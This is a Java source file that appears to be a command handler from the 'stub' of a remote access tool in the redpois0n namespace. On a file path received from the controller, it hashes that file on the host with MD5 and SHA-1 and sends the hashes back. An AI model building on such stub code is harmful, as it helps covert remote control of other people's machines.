package com.redpois0n.stub.packets.incoming;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.common.codec.Md5;
import com.redpois0n.common.codec.Sha1;
import com.redpois0n.stub.packets.outgoing.Packet46FileHash;

public class Packet64FileHash extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String path = Connection.readLine();
		
		File file = new File(path);
		
		String md5 = Md5.md5(file); 
		String sha1 = Sha1.sha1(file);
		
		System.gc();
		
		Connection.addToSendQueue(new Packet46FileHash(md5, sha1));
	}

}
